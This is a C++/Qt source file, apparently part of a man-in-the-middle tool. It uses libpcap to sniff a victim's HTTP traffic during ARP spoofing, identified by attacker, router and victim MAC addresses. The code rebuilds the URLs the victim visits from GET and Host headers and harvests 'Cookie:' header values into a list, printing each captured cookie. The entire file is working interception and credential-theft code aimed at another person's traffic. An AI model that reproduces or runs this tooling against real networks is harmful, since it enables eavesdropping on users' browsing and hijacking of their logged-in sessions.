#include "relay_spoof.h"
#include <QCoreApplication>

void get_mac_filter(char *get, u_char *my);
int flag_check_get(u_char *a, u_char *b);
//void get_print_packet(int len, u_char *packet);
void getUrl(u_char *packet, int len);
void sendUrl(u_char *packet, int len);

QStringList relay_url_list, relay_data_list;
int get_broad_cnt = 0, test_cnt = 0;

u_char spoofAtkMac[6], spoofRouterMac[6], spoofVictimMac[6];
pcap_t *spoofPcap;
pcap_if_t *spoofDevs;

relay_spoof::relay_spoof(QObject *parent) : QThread(parent) {

}

void relay_spoof::run() {
    int cnt = 0, i = 0;
    bpf_u_int32 netp, maskp;
    struct bpf_program filter;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr *pkthdr;
    u_char *packet;
    struct libnet_ethernet_hdr *eth;

    if(pcap_lookupnet(spoofDevs->name, &netp, &maskp, errbuf) == -1) exit(1);
    spoofPcap = pcap_open_live(spoofDevs->name, 65535, 0, -1, errbuf);
    if(pcap_compile(spoofPcap, &filter, "tcp port 80 or tcp port 443 or tcp port 8080", 0, maskp) == -1) exit(1);
    if(pcap_setfilter(spoofPcap, &filter) == -1) exit(1);

    get_mac_filter(relayAtkMac.toLatin1().data(), spoofAtkMac);
    get_mac_filter(relayRouterMac.toLatin1().data(), spoofRouterMac);
    get_mac_filter(relayVictimMac.toLatin1().data(), spoofVictimMac);

    spoofStop = false;

    while(1) {
        while((cnt = pcap_next_ex(spoofPcap, &pkthdr, (const u_char**)&packet)) > 0) {
            eth = (struct libnet_ethernet_hdr *)packet;

            if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) == 1 && flag_check_get(eth->ether_shost, spoofVictimMac) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
/*                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                    *(packet + i) = *(spoofRouterMac + i);
                    *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                }
                pcap_sendpacket(spoofPcap, packet, pkthdr->len);
//                printf("\n##### Host Get Packet #####\n");
//                get_print_packet(pkthdr->len, packet);
*/
                getUrl(packet, pkthdr->len);
                if(get_broad_cnt != test_cnt) {
                    emit relay_urlList(relay_url_list);
                    test_cnt++;
                }
            }
            if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) != 1 && flag_check_get(eth->ether_shost, spoofVictimMac) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
/*                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                    *(packet + i) = *(spoofVictimMac + i);
                    *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                }
                pcap_sendpacket(spoofPcap, packet, pkthdr->len);
//                printf("\n##### DNS Packet #####\n");
//                get_print_packet(length, packet);
*/
                sendUrl(packet, pkthdr->len);
            }
        }
        if(spoofStop) break;
    }
    emit relay_dataList(relay_data_list);
    emit relay_spoofFin(true);
}

void get_mac_filter(char *get, u_char *my) {	// owner mac address save at my_mac variable
    int i, j = 0;
    for(i = 0; i < ETHER_ADDR_LEN; i++) {
        if(*(get+j) < 'A') {
            *(my+i) = (*(get+j) - '0') * 0x10;
            if(*(get+j+1) < 'A') *(my+i) += (*(get+j+1) - '0') * 0x01;
            else *(my+i) += (*(get+j+1) == 'A') ? 0x0A : ((*(get+j+1) == 'B') ? 0x0B : ((*(get+j+1) == 'C') ? 0x0C : ((*(get+j+1) == 'D') ? 0x0D : ((*(get+j+1) == 'E') ? 0x0E : 0x0F))));
        }
        else {
            *(my+i) = (*(get+j) == 'A') ? 0xA0 : ((*(get+j) == 'B') ? 0xB0 : ((*(get+j) == 'C') ? 0xC0 : ((*(get+j) == 'D') ? 0xD0 : ((*(get+j) == 'E') ? 0xE0 : 0xF0))));
            if(*(get+j+1) < 'A') *(my+i) += (*(get+j+1) - '0') * 0x01;
            else *(my+i) += (*(get+j+1) == 'A') ? 0x0A : ((*(get+j+1) == 'B') ? 0x0B : ((*(get+j+1) == 'C') ? 0x0C : ((*(get+j+1) == 'D') ? 0x0D : ((*(get+j+1) == 'E') ? 0x0E : 0x0F))));
        }
        j += 2;
    }
}

int flag_check_get(u_char *a, u_char *b) {	// compare with mac address
    int value = 0;
    value = (*a != *b ? 1 : ((*(a+1) != *(b+1)) ? 1 : ((*(a+2) != *(b+2)) ? 1 : ((*(a+3) != *(b+3)) ? 1 : ((*(a+4) != *(b+4)) ? 1 : ((*(a+5) != *(b+5)) ? 1 : -1))))));
    return value;
}
/*
void get_print_packet(int len, u_char *packet) {
    int cnt = 0;
    printf("\n");
    while(len-- != 0) {
        printf("%02x ", *(packet++));
        if ((++cnt % 16) == 0) printf("\n");
    }
    printf("%02x\n", *packet);
}
*/
void getUrl(u_char *packet, int len) {
    int i = 0, tmp = 0, cnt = 0, get_len = len;
    bool var = false;
    u_char *text = packet;
    QString imsi, tempStr;
    text += 54;
    get_len -= 54;
    while(get_len > 0) {
        if(*(text+i) == 71 && *(text+i+1) == 69 && *(text+i+2) == 84)
            while(get_len > 0) {
                if(*(text+i) > 32 && *(text+i) < 127) {
                    tempStr.append(*(text+i));
                    tmp = 0;
                    var = true;
                }
                if(*(text+i) < 32 && var == true) tempStr.append('.');
                else if(*(text+i) == 32 && var == true) tempStr.append(' ');
                i++;
                get_len--;
            }
        i++;
        get_len--;
        if(var == true) break;
    }
    i = 0; tmp = 0;
    if(!tempStr.isEmpty()) {
//        qDebug() << "#####getUrl : " << tempStr;
        while(true) {
            if(tempStr.at(i) == 'H' && tempStr.at(i+1) == 'o' && tempStr.at(i+2) == 's' && tempStr.at(i+3) == 't' && tempStr.at(i+4) == ':') {
                i += 6;
                imsi.append("http://");
                while(true) {
                    if((tempStr.at(i) == '.' && tempStr.at(i+1) == '.') || tempStr.length() == i) break;
                    imsi.append(tempStr.at(i++));
                }
                i -= (tmp + imsi.length() - 1);
                while(true) {
                    if(tempStr.at(i) == 'G' && tempStr.at(i+1) == 'E' && tempStr.at(i+2) == 'T' && tempStr.at(i+5) != ' ') {
                        i += 4;
                        while(true) {
                            imsi.append(tempStr.at(i++));
                            if(tempStr.at(i) == '/' && tempStr.at(i+1) == ' ') break;
                            else if((tempStr.at(i+1) == 'H' && tempStr.at(i+2) == 'T' && tempStr.at(i+3) == 'T' && tempStr.at(i+4) == 'P' && tempStr.at(i+5) == '/') || tempStr.length() == i) break;
                        }
                    }
                    else if(tempStr.length() == (++i)) break;
                }
                if(!relay_url_list.isEmpty()) for(tmp = 0; tmp < relay_url_list.length(); tmp++) if(relay_url_list.at(tmp) == imsi) cnt = 100;
                if(cnt != 100) {
                    get_broad_cnt++;
                    imsi.detach();
                    relay_url_list.append(imsi);
                }
            }
            if(tempStr.length() <= (++i)) break;
            else tmp = i;
        }
        i = 0; imsi.clear();
        if(tempStr.contains("Cookie: ")) {
            while(true) {
                if(tempStr.at(i) == 'C' && tempStr.at(i+1) == 'o' && tempStr.at(i+2) == 'o' && tempStr.at(i+3) == 'k' && tempStr.at(i+4) == 'i' && tempStr.at(i+5) == 'e' && tempStr.at(i+6) == ':' && tempStr.at(i+7) == ' ') {
                    while(true) {
                        imsi.append(tempStr.at(i++));
                        if(tempStr.at(i) == '.' && tempStr.at(i+1) == '.' && tempStr.at(i+2) == '.' && tempStr.at(i+3) == '.') break;
                    }
                    relay_data_list.append(imsi);
                    break;
                }
                else if(tempStr.length() == (++i)) break;
            }
        }
        else relay_data_list.append("Not exist cookie");
        qDebug() << "#####Cookie : " << relay_data_list.at(get_broad_cnt - 1);
    }
}

void sendUrl(u_char *packet, int len) {
    QString tempStr;
    u_char *text = packet;
    for(int i = 0; i < (len - 1); i++) tempStr.append(*(text+i));
//    qDebug() << "sendUrl : " << tempStr;
}

void relay_spoof::relayGetMacInfo(QString victim, QString atk, QString router, pcap_if_t *devs) {
    relayVictimMac = victim;
    relayAtkMac = atk;
    relayRouterMac = router;
    spoofDevs = devs;
}
